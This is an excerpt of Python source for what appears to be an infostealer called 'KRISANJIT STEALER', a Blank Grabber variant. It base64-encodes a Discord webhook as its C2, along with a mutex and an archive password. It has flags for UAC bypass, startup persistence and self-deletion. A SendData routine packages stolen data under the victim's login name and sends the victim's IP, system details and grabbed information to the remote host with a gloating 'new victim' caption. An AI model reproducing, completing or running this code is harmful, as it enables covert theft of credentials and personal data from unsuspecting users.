...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE3OTkwNDIzNjI4MTEzOTI3MS82VG9UQmpGaWRXQ18tNWVCaEx5YW1GUVB3QmN5YmdxOWN3YXFNM0hIZUJXTWliX2pNMndaMTdlbndJR1pmNWVSVnRLTw==').decode())
    Mutex = base64.b64decode('N3NCR1RqNWtpSzNVQkRTaA==').decode()
    PingMe = bool('true')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('a3Jpc2Fuaml0').decode()
...
class BlankGrabber:
    ...
    def SendData(self) -> None:
        ...
        filename = 'Silent-%s.%s' % (os.getlogin(), extention)
        ...
        match Settings.C2[0]:
            ...
            case 1:
                payload = {'caption': f'<b>KRISANJIT STEALER</b> GOT A NEW VICTIM DEV :- @K_HACKER_ANONYMOUS : <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
